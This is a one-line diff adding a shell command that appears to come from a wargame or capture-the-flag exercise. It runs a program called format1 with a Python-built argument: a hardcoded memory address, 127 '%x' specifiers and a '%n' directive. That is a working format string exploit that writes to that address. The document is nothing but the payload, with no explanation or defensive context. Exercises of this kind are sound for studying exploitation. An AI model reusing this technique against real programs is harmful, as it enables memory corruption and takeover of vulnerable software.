@@ -1,0 +1,1 @@
+./format1 "`python -c "print('8\x96\x04\x08' + '%x\n' * 127 + '%n')"`"
